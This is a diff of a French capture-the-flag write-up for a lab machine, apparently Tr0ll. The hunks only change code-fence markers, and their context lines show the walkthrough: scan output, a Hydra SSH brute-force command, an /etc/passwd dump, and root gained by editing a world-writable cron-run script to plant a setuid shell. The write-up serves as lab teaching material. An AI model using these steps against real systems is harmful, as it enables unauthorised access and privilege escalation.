@@ -17,7 +17,7 @@ Mais trop de guessing peu suffire à vous pourrir la vie comme sur le CTF *Flick
 Tour rapide
 -----------
 
-```plain
+```
 Not shown: 65532 closed ports
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.2
@@ -43,7 +43,7 @@ Don't feed the troll
 
 Je décide de sortie l'artillerie lourde :  
 
-```plain
+```
 $ python /work/vrd/exploits/ftp/devloop-vsftpd-3.0.2-l33t-0day-exploit.py
 [i] devloop !PRIVATE! 0day exploit for VSFTPd 3.0.2 (Ubuntu)
 [*] Connection as anonymous successful !
@@ -65,7 +65,7 @@ La vérité vraie
 
 On récupère le fichier *lol.pcap* présent sur le ftp. Il s'agit justement d'une capture réseau d'une session FTP :  
 
-```plain
+```
 220 (vsFTPd 3.0.2)
 USER anonymous
 331 Please specify the password.
@@ -110,7 +110,7 @@ Ainsi si on se rend sur */sup3rs3cr3tdirlol/* sur le serveur web on trouve un bi
 
 Une analyse rapide via *gdb* montre que le programme ne fait rien de plus qu'un *printf*.  
 
-```plain
+```
 $ ./roflmao 
 Find address 0x0856BF to proceed
 ```
@@ -119,7 +119,7 @@ Du coup on pointe le navigateur sur */0x0856BF/* où se trouvent deux sous-dossi
 
 Le fichier texte */0x0856BF/good\_luck/which\_one\_lol.txt* semble contenir une liste d'utilisateurs :  
 
-```plain
+```
 maleus
 ps-aux
 felux
@@ -146,7 +146,7 @@ J'ai rencontré quelques difficultés pour casser le mot de passe car *Hydra* se
 
 Heureusement il est possible de reprendre l'attaque via -R après avoir attendu que *fail2ban* nous re-accepte :  
 
-```plain
+```
 $ ./hydra -L ../users.txt -P ../pass.txt -V -t 1 -f -W 6 ssh://192.168.1.78
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -182,7 +182,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-08-22 08:08:37
 
 Une fois l'accès obtenu on voit que plusieurs utilisateurs ont été créés :  
 
-```plain
+```
 troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
 sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
 ftp:x:104:112:ftp daemon,,,:/srv/ftp:/bin/false
@@ -205,7 +205,7 @@ Le nombre de fausses pistes se réduit ainsi à 0.
 
 On trouve un script Python que l'on ne peut malheureusement pas lire :  
 
-```plain
+```
 overflow@troll:/$ ls -l /opt/
 total 4
 -rwx--x--x 1 root root 117 Aug 10 02:11 lmao.py
@@ -213,7 +213,7 @@ total 4
 
 La liste des fichiers appartenant à *troll* montre peu d'intérêts :  
 
-```plain
+```
 /srv/ftp/lol.pcap
 /home/troll
 /home/troll/.cache
@@ -224,7 +224,7 @@ La liste des fichiers appartenant à *troll* montre peu d'intérêts :
 
 Au boût d'un moment notre connexion SSH est coupée :  
 
-```plain
+```
 Broadcast Message from root@trol                                               
         (somewhere) at 14:00 ...                                               
 
@@ -241,7 +241,7 @@ Je me reconnecte après avoir uploadé mon script maison de recherche de permiss
 
 Notez que le script n'est pas parfait et donne pas mal de faux positifs :  
 
-```plain
+```
 overflow@troll:/tmp$ python search.py 
 File /bin/su is setuid root
 File /bin/ping is setuid root
@@ -306,7 +306,7 @@ File /srv/ftp/lol.pcap is world-writable !
 
 Effectivement les permissions sur le script *cleaner.py* sont open-bar :  
 
-```plain
+```
 overflow@troll:/tmp$ ls -l /lib/log/cleaner.py
 -rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
 overflow@troll:/tmp$ cat /lib/log/cleaner.py
@@ -323,7 +323,7 @@ Le script sert tout simplement à vider le dossier */tmp*.
 
 Dans le fichier swap qui doit être généré par *Vim* on trouve une information intéressante :  
 
-```plain
+```
 overflow@troll:/$ ls -al /var/tmp/cleaner.py.swp
 -rwxrwxrwx 1 root root 34 Aug 13 01:16 /var/tmp/cleaner.py.swp
 overflow@troll:/$ cat /var/tmp/cleaner.py.swp
@@ -344,7 +344,7 @@ except:
 
 Après un moment on a bien récupéré les permissions :  
 
-```plain
+```
 overflow@troll:/$ ls -l /run/shm/
 total 2724
 -rwsr-xr-x 1 root root 2786558 Aug 21 14:30 getroot
@@ -352,7 +352,7 @@ total 2724
 
 Seulement, à l'exécution...  
 
-```plain
+```
 overflow@troll:/$ /run/shm/getroot 
 overflow@troll:/$ id
 uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
@@ -376,7 +376,7 @@ systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=
 
 Le dossier */run/shm* est monté en nosuid. On va chercher ailleurs un dossier dans lequel on peut écrire :  
 
-```plain
+```
 overflow@troll:/$ find / -type d -writable 2> /dev/null | grep -v /proc
 /tmp
 /run/user/1002
@@ -389,7 +389,7 @@ overflow@troll:/$ find / -type d -writable 2> /dev/null | grep -v /proc
 
 /var/tmp devrait faire l'affaire. On rectifie le cleaner une nouvelle fois et on recommence :  
 
-```plain
+```
 overflow@troll:/$ ls /var/tmp/getroot -l
 -rwsr-xr-x 1 root root 2786558 Aug 21 18:23 /var/tmp/getroot
 overflow@troll:/$ /var/tmp/getroot
@@ -411,12 +411,12 @@ Sous la capôt
 
 On trouve deux lignes dans la crontab de root :
 
-```plain
+```
 */5 * * * * /usr/bin/python /opt/lmao.py
 */2 * * * * /usr/bin/python /lib/log/cleaner.py
 ```
 
-```plain
+```
 root@troll:/root# cat /opt/lmao.py
 #!/usr/bin/env python
 import os
